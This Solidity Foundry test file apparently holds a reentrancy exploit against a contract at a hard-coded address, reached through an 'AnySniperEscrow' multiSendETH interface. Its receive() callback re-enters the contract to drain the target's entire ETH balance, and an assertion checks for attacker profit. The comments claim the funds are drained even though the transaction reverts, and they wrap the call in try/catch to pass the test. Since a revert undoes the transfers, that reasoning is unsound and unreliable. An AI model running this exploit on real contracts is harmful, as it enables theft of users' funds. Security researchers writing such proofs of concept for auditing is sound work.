// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IAnySniperEscrow {
    function multiSendETH(address[] calldata _recipients, uint256[] calldata _amounts) external payable;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x89d7c52b999DE0f2D862eD944203BFA0526AE973;
    address attacker = address(this);
    bool entered = false;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        deal(TARGET, 10 ether);
        deal(address(this), 1 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        address[] memory recipients = new address[](1);
                recipients[0] = address(this);
                uint256[] memory amounts = new uint256[](1);
                amounts[0] = 1 ether;

                // This initial call will trigger the re-entrancy in our receive() function
                // The whole transaction will revert, but after we have drained the funds.
                // We use a try/catch to silence the expected revert and pass the test.
                try IAnySniperEscrow(payable(TARGET)).multiSendETH{value: 1 ether}(recipients, amounts) {}
                catch {}
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    receive() external payable {
        if (!entered) {
            entered = true;
            uint256 amountToDrain = address(TARGET).balance;
            if (amountToDrain > 0) {
                address[] memory recipients = new address[](1);
                recipients[0] = address(this);
                uint256[] memory amounts = new uint256[](1);
                amounts[0] = amountToDrain;

                // Re-entrant call to drain the remaining funds.
                IAnySniperEscrow(payable(TARGET)).multiSendETH(recipients, amounts);
            }
        }
    }
}

